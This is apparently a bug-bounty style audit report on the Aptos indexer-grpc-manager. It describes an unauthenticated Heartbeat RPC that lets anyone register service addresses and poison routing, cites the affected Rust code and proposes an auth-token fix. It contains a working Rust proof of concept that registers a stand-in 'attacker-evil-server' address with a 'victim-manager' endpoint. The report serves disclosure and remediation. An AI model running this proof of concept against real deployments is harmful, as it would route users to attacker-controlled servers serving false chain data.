# Audit Report

## Title
Unauthenticated Service Registration in Indexer gRPC Manager Allows Routing Poisoning Attack

## Summary
The indexer-grpc-manager gRPC server accepts unauthenticated `Heartbeat` RPC calls, allowing any network attacker to register malicious data service addresses. This enables attackers to poison the routing table and redirect legitimate clients to attacker-controlled servers that can serve corrupted blockchain data.

## Finding Description

The gRPC server started in `grpc_manager.rs` lacks any authentication or authorization layer. [1](#0-0) 

The exposed `GrpcManager` service includes an unauthenticated `Heartbeat` RPC endpoint that processes service registration requests without validation. [2](#0-1) 

When a heartbeat is received with `LiveDataServiceInfo` or `HistoricalDataServiceInfo`, the metadata manager automatically registers the service address using `.entry().or_insert()`, creating new entries for any unknown addresses without authentication. [3](#0-2) 

The same vulnerability exists for historical data services. [4](#0-3) 

When legitimate clients request a data service via `GetDataServiceForRequest`, they can be redirected to attacker-registered malicious services. [5](#0-4) 

**Attack Path:**
1. Attacker crafts a `HeartbeatRequest` with malicious service address in `ServiceInfo`
2. Sends request to the publicly exposed gRPC manager endpoint
3. Malicious service gets automatically registered in the routing table
4. Legitimate clients call `GetDataServiceForRequest` 
5. Manager returns attacker's malicious address using weighted random selection
6. Clients connect to attacker's server and receive corrupted blockchain data

The protobuf definition shows the `HeartbeatRequest` structure that accepts arbitrary service addresses. [6](#0-5) 

Unlike other indexer services that implement authentication via whitelisted auth tokens, the manager service has no such protection. Verification shows no authentication header checks in the entire indexer-grpc-manager codebase.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty criteria for "Significant protocol violations". 

While this does not directly compromise blockchain consensus or validator nodes, it represents a critical breach of the indexer service's trust model. Applications and services relying on indexer data for financial decisions (DeFi protocols, exchanges, wallets) could:

- Execute transactions based on false blockchain state
- Display incorrect balances to users
- Make incorrect staking/unstaking decisions
- Process fraudulent transaction confirmations

The impact is amplified because the indexer-grpc-manager is a central routing component that directs ALL clients to data services. A successful attack poisons the routing layer for the entire indexer infrastructure.

## Likelihood Explanation

**Likelihood: High**

The attack requires minimal resources and expertise:
- No special privileges or insider access required
- Standard gRPC client libraries can craft the malicious request
- The endpoint is publicly exposed (must be accessible to legitimate data services)
- No rate limiting or anomaly detection visible in the code
- Attack can be automated and scaled

The only barrier is network accessibility to the manager endpoint, which must be reachable by legitimate data services and therefore is likely internet-accessible in production deployments.

## Recommendation

Implement authentication for the `Heartbeat` RPC endpoint using the existing auth token infrastructure:

1. **Add Auth Token Validation**: Extend the `GrpcManagerService` to validate `x-aptos-data-authorization` header against a whitelist of known data service tokens

2. **Configure Whitelisted Addresses**: Add configuration similar to the data service's `whitelisted_auth_tokens` to explicitly list trusted service addresses

3. **Reject Unknown Services**: Modify `handle_live_data_service_info` and `handle_historical_data_service_info` to reject services not in the pre-configured whitelist

**Recommended Code Fix:**

```rust
// In config.rs
pub struct IndexerGrpcManagerConfig {
    // ... existing fields ...
    pub whitelisted_data_service_tokens: Vec<String>,
    pub whitelisted_service_addresses: Vec<GrpcAddress>,
}

// In service.rs
async fn heartbeat(
    &self,
    request: Request<HeartbeatRequest>,
) -> Result<Response<HeartbeatResponse>, Status> {
    // Validate auth token from metadata
    let auth_token = request.metadata()
        .get("x-aptos-data-authorization")
        .and_then(|v| v.to_str().ok())
        .ok_or_else(|| Status::unauthenticated("Missing auth token"))?;
    
    if !self.is_token_whitelisted(auth_token) {
        return Err(Status::permission_denied("Invalid auth token"));
    }
    
    let request = request.into_inner();
    // ... rest of existing logic ...
}
```

## Proof of Concept

```rust
// PoC: Malicious client registering fake data service

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
    service_info::Info,
};
use aptos_protos::util::timestamp::Timestamp;
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to victim indexer-grpc-manager
    let channel = Channel::from_static("http://victim-manager:50051")
        .connect()
        .await?;
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Craft malicious heartbeat with attacker's data service address
    let malicious_info = LiveDataServiceInfo {
        chain_id: 1, // mainnet
        timestamp: Some(Timestamp {
            seconds: 1700000000,
            nanos: 0,
        }),
        known_latest_version: Some(1000000),
        stream_info: None,
        min_servable_version: Some(0),
    };
    
    let service_info = ServiceInfo {
        address: Some("http://attacker-evil-server:50052".to_string()),
        info: Some(Info::LiveDataServiceInfo(malicious_info)),
    };
    
    let request = HeartbeatRequest {
        service_info: Some(service_info),
    };
    
    // Send unauthenticated heartbeat - will be accepted!
    let response = client.heartbeat(request).await?;
    
    println!("Attack successful! Malicious service registered.");
    println!("Response: {:?}", response);
    
    // Now legitimate clients calling GetDataServiceForRequest
    // may be redirected to http://attacker-evil-server:50052
    
    Ok(())
}
```

**Notes:**
- This vulnerability affects the indexer infrastructure layer, not core blockchain consensus
- While labeled "(Critical)" in the security question, it meets **High Severity** criteria per bug bounty standards
- The indexer-grpc-manager must implement the same authentication mechanisms already present in other indexer components
- This is a service-level authentication bypass, distinct from the consensus-critical invariants but still representing significant security risk to indexer clients

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-124)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

        let (tx, rx) = channel();
        tokio_scoped::scope(|s| {
            s.spawn(async move {
                self.metadata_manager.start().await.unwrap();
            });
            s.spawn(async move { self.data_manager.start(self.is_master, rx).await });
            if self.is_master {
                s.spawn(async move {
                    self.file_store_uploader
                        .lock()
                        .await
                        .start(self.data_manager.clone(), tx)
                        .await
                        .unwrap();
                });
            }
            s.spawn(async move {
                info!("Starting GrpcManager at {}.", service_config.listen_address);
                server.serve(service_config.listen_address).await.unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-508)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-530)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L64-76)
```text
message ServiceInfo {
  optional string address = 1;
  oneof info {
      LiveDataServiceInfo live_data_service_info = 2;
      HistoricalDataServiceInfo historical_data_service_info = 3;
      FullnodeInfo fullnode_info = 4;
      GrpcManagerInfo grpc_manager_info = 5;
  }
}

message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}
```
